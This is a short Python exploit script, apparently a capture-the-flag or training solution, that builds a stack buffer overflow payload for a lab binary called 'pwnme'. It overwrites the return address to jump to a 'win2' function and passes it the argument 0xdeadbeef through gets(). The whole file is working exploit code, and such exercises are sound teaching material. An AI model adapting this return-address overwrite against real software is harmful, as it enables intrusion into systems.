#!/usr/bin/env python3
# usage: python3 vanilla_full.py | ./pwnme

import sys

# Create your bytes data
payload = b''

payload += b'A' * 16 # fill the buffer
payload += b'B' * 8  # overwrite some other misc data on the stack
payload += b'C' * 4  # padding for ebp
payload += b'\x96\x91\x04\x08'  # win2 function address is 0x8049196
payload += b'D' * 4             # win2 function address is 0x8049196
payload += b'\xef\xbe\xad\xde'  # arg1 for win2 is 0xdeadbeef
payload += b'\n'                # ending newline to terminate gets() read

sys.stdout.buffer.write(payload)
